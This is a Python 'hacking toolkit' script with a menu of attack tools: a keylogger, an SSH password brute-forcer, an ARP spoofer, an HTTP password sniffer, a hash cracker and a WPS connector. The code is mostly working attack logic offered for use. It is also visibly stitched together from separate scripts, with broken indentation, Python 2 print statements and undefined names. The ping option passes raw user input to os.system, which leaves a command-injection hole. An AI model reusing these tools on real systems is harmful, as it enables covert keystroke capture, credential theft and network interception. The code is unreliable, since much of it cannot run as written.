import  socket
import sys
from colorama import init, Fore
import os
import subprocess
import time
import shutil
import zipfile
import argparse
from pynput.keyboard import Key, Listener
import logging
from app.utils import *
import portscanner
import paramiko, sys, os, socket, termcolor
import scapy.all as scapy
from scapy.layers.inet import TCP, IP
from urllib import parse
import re
import hashlib

init()

text_green=Fore.GREEN
text_blue=Fore.BLUE

print("     ")
print("     ")
print("     ")
print(text_green+"                     .~?5GBBGPY!:.                                                                                                          ")
print(text_green+"                  ^P&@@@@@@@@@@@@@B?.                                                                                                       ")
print(text_green+"                7&@@@@@@@@@@@@@@@@@@@G:                                                                                                     ")
print(text_green+"               B@@@@@@@@@@@@@@@@@@@@@@@!                                                                                                    ")
print(text_green+"      .PP7.   G@@@@@@@@@@@@@@@@@@@@@@@@@:  .!J5!                                                                                            ")
print(text_green+"     .B@@@@J .@@@@@@@@@@@@@@@@@@@@@@@@@@Y :&@@@@7                                                                                           ")
print(text_green+"    G@@@@@@@@J@@@B@@@@@@@@@@@@@@@@@@@B@@GY@@@@@@@&~                                                                                         ")
print(text_green+"    B@@@@@@@@5&@B&@@@@@@@@@@@@@@@@@@@B@@5@@@@@@@@@~     7B&&&G^    ?GP.                        ^YB&&&BGJ.       :YGPPGP                     ")
print(text_green+"     ?GBBBB&&BP&&@Y!~~!YB@@@@@G!^^~7B@B@5@&BBBBB5:     G@@G~@@@^  5@@!                .      .B@@@@&@@@@@7     B@@@@@@@              .      ")
print(text_green+"             .:5@~       G@@@!       &&^..            .@@@. B@@? G@&:        J&BBBPB@@@@&G.  B@@@@~  B@@@@:    &BB@@@@B     J&BBBP@@@@&G.  ")
print(text_green+"              !&@^      ^@@@@G.      B@P               &@@Y?@@&:B@&~P&@@@B^  G@@@@@&B@@@@@B :@@@@B   5@@@@!      5@@@@P     B@@@@@&B@@@@@B  ")
print(text_green+"              !@@&7^^!5&@7.7.B@BY7!!P@@B                JB&&BJ^B@B:&@@!^@@@. B@@@@?  !@@@@B ~@@@@P   B@@@@:      B@@@@J     B@@@@?  !@@@@B  ")
print(text_green+"               ^B@@@@@@@B :5 ^@@@@@@@@5.                     .&@B ^@@@  @@@: &@@@@   ^@@@@P .@@@@&: ?@@@@G       &@@@@!     &@@@@   ~@@@@5  ")
print(text_green+"                .~&G.G@@@5B@YB@@@~!&G^.                     ~@@G  .&@@5B@@G .@@@@&   ?@@@@Y  ^&@@@@@@@@@5        @@@@@~    .@@@@&   ?@@@@J  ")
print(text_green+"      .....^!YB@@Y@@:7&&@@@@@@@&G.P@&Y@BP?~^:....           Y5?     ?PBG5~  .55557   ^5555:    ^JPGGPY~.         Y5555.    .55557   ~5555:  ")
print(text_green+"    .&@@@@@@@@@@@!B@@&BB&B&BBB&BB@@@JG@@@@@@@@@@@J                                                                                          ")
print(text_green+"    :@@@@@@@@@&J:  B@@@&BGBBGBB@@@@!  ~G@@@@@@@@@P                                                                                          ")
print(text_green+"      Y@@@@@B~     .B@@@@@@&@@@@@@~     .J@@@@@@.                                                                                           ")
print(text_green+"      .GBBP:         !B@@@@@@@@&Y.         JBBB7                                                                                            ")
print(text_green+"                       .^^^~~^.                                                                                                             ")
print("    ")
print("    ")
print(text_blue +"✗ Power by %n01n ")
print("    ")
print("    ")
print("✚ List of subroutines :")
print("    ")
print("⮩  1 - IP Finder")
print("⮩  2 - Port Scanner")
print("⮩  3 - Keylogger")
print("⮩  4 - WPS master")
print("⮩  5 - Brute Force Login Master")
print("⮩  6 - ARP Spoofer")
print("⮩  7 - Password Sniffer")
print("⮩  8 - Password Cracker")
print("⮩  9 - Host Ping")
print("⮩ 10 - Vulnerability")
x=(int(input("✚ Enter the number opposite the desired program : ")))


if x==1:
    flammaIP = socket.gethostname()
    IP_Address= socket.gethostbyname(flammaIP)
    print(Fore.GREEN+f"IP Address : {IP_Address}")
    sys.exit()
elif x==2:
    GREEN = Fore.GREEN
    RESET = Fore.RESET
    GRAY = Fore.LIGHTBLACK_EX
    def is_port_open(host, port):
        s = socket.socket()
        try:
            s.connect((host, port))
            s.settimeout(0.2)
        except:
            return False
        else:
            return True
    host = input("Enter the host:")
    for port in range(1, 1025):
        if is_port_open(host, port):
            print(f"{GREEN}[+] {host}:{port} is open      {RESET}")
        else:
            print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")
        sys.exit()

elif x==3:
    log_dir = "/home/keylogger/"
    logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()
    sys.exit()
elif x==4:
    class fake_fp:
        def show(self, msg):
         print('fake_fp: ' + msg)

        def reset(self):
            self.show('done')

def display(msg=None, reset=False):
    fp.show(msg)
    time.sleep(2)
    if reset:
        fp.reset()

def get_ssids(scan):
    ssids = []
    try:
        lines = scan.split('\n')
        n = len(lines)
        if n <= 2:
            return -1
        i = 0
        for l in lines:
            _ = l.split()
            if _ == []:
                pass
            elif i > 1:
                ssids.append(_[-1])
            i += 1
        return ssids
    except Exception as e:
        print ("Failed get_ssids()")
        return -1

def shell_cmd(cmd):
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE)
    out, err = p.communicate()
    if err:
        print(err)
        return -1
    else:
        #print out
        return out

def _scan():
    cmd = ['wpa_cli', 'scan']
    resp = shell_cmd(cmd)
    if resp == -1:
        return -1
    else:
        return 0

def scan():
    # First scan
    # Then get results
    resp = _scan()
    if resp == -1:
        return -1

    # Ok, get results
    cmd = ['wpa_cli', 'scan_results']
    resp = shell_cmd(cmd)
    if resp == -1:
        return -1
    else:
        #print resp
        return resp

def wps_connect(ssid):
    cmd = ['wpa_cli', 'wps_pbc', ssid]
    resp = shell_cmd(cmd)
    if resp == -1:
        return -1
    else:
        print (repr(resp))
        return 0

def halt():
    if not is_fake_fp:
        os.system('halt')

def reboot():
    if not is_fake_fp:
        os.system('reboot')

if __name__ == "__main__":
    curr_dir = os.getcwd()
    fname = 'scan_results.txt'
    of = os.path.join(curr_dir, fname)
    try:
        import bap_com
        fp = bap_com.FrontPanel()
        is_fake_fp = False
    except Exception as e:
        print ("Using fake fp")
        fp = fake_fp()
        is_fake_fp = True

    display('wps')
    scan_res = scan()
    if scan_res == -1:
        display('scan error', True)
        exit(1)

    ssids = get_ssids(scan_res)
    if ssids == -1:
        display('ssid error', True)
        exit(1)

    i = 1
    with open(of, 'w') as f:
        for ssid in ssids:
            f.write(ssid + '\n')
            display(ssid + ' - ' + str(i))
            i+=1

    resp = 0
    magic_ssid = 'dont check' #'bohmeraudio'
    if magic_ssid in ssids:
        display('Connecting...')
        resp = wps_connect(magic_ssid)
        if resp == -1:
            display('Failed.')
        else:
            display('Connected')
            display('Restarting')
            reboot()

    display('Finished')
    display('Start AP')
    time.sleep(1)
    halt()
    sys.exit()
elif x==5:
    def ssh_connect(password, code=0):
        ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')
        if os.path.exists(input_file) == False:
            print('[!!] That File/Path Does Not Exist')
            sys.exit(1)
        with open(input_file, 'r') as file:
            for line in file.readlines():
                password = line.strip()
                try:
                    response = ssh_connect(password)
                    if response == 0:
                        print(termcolor.colored(('[+] Found Password: ' + password + ' ,For Account: ' + username),'green'))
                        break
                    elif response == 1:
                        print('[-] Incorrect Login: ' + password)
                    elif response == 2:
                        print('[!!] Can Not Connect')
                        sys.exit(1)
                except Exception as e:
                    print(e)
                    pass

elif x==6:
    def get_mac_address(ip_address):
        broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_layer = scapy.ARP(pdst=ip_address)
        get_mac_packet = broadcast_layer/arp_layer
        answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
        return answer[0][1].hwsrc

    def spoof(router_ip, target_ip, router_mac, target_mac):
        packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
        packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
        scapy.send(packet1)
        scapy.send(packet2)

    target_ip = str(sys.argv[2])
    router_ip = str(sys.argv[1])
    target_mac = str(get_mac_address(target_ip))
    router_mac = str(get_mac_address(router_ip))

    try:
        while True:
            spoof(router_ip, target_ip, router_mac, target_mac)
            time.sleep(2)
    except KeyboardInterrupt:
            print('Closing ARP Spoofer.')
            #exit(0)

elif x==7:
    iface = "eth0"
    def get_login_pass(body):

        user = None
        passwd = None

        userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

        for login in userfields:
            login_re = re.search('(%s=[^&\']+)' % login, body, re.IGNORECASE)
            if login_re:
                user = login_re.group()
        for passfield in passfields:
            pass_re = re.search('(%s=[^&\']+)' % passfield, body, re.IGNORECASE)
            if pass_re:
                passwd = pass_re.group()

        if user and passwd:
            return(user,passwd)


    def pkt_parser(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
            body = str(packet[TCP].payload)
            user_pass = get_login_pass(body)
            if user_pass != None:
                print(packet[TCP].payload)
                print(parse.unquote(user_pass[0]))
                print(parse.unquote(user_pass[1]))
        else:
            pass

    try:
        sniff(iface=iface, prn=pkt_parser, store=0)
    except KeyboardInterrupt:
        print('Exiting')
        exit(0)
elif x==8:
    type_of_hash = str(input('Enter type of hash you want to bruteforce (md5, sha1, sha256, sha512): '))
    file_path = str(input('Enter path to the file to bruteforce with: '))
    hash_to_decrypt = str(input('Enter hash value to bruteforce: '))
    if os.path.exists(file_path) == False:
        print('[!!] That File/Path Doesnt Exist')
        exit(1)
    with open(file_path, 'r') as file:
        for line in file.readlines():
            if type_of_hash == 'md5':
                hash_object = hashlib.md5(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found MD5 Password: ' + line.strip())
                    exit(0)
            elif type_of_hash == 'sha1':
                hash_object = hashlib.sha1(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found SHA1 Password: ' + line.strip())
                    exit(0)
            elif type_of_hash == 'sha256':
                hash_object = hashlib.sha256(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found SHA256 Password: ' + line.strip())
                    exit(0)
            elif type_of_hash == 'sha512':
                hash_object = hashlib.sha512(line.strip().encode())
                hashed_word = hash_object.hexdigest()
                if hashed_word == hash_to_decrypt:
                    print('Found SHA512 Password: ' + line.strip())
                    exit(0)
            else:
                print('[!!] Type of Hash is Incorrect.')
            exit(1)
    print('Password Is Not In File.')
elif x==9:
    import os
    host_ping=input(text_blue+"pls enter website link :")
    hostname =(host_ping)
    response = os.system("ping -c 1 " + hostname)

    if response == 0:
        print hostname, 'is up!'
    else:
        print hostname, 'is down!'
        sys.exit()
elif x==10:
    targets_ip = input('[+] * Enter Target To Scan For Vulnerable Open Ports: ')
    port_number = int(input('[+] * Enter Amount Of Ports You Want To Scan (500 - First 500 Ports): '))
    vul_file = input('[+] * Enter Path To The File With Vulnerable Softwares: ')
    print('\n')

    target = portscanner.portscan(targets_ip, port_number)
    target.scan()
    with open(vul_file,'r') as file:
        count = 0
        for banner in target.banners:
            file.seek(0)
            for line in file.readlines():
                if line.strip() in banner:
                    print('[!!] VULNERABLE BANNER: "' + banner + '" ON PORT: ' + str(target.open_ports[count]))
        count += 1
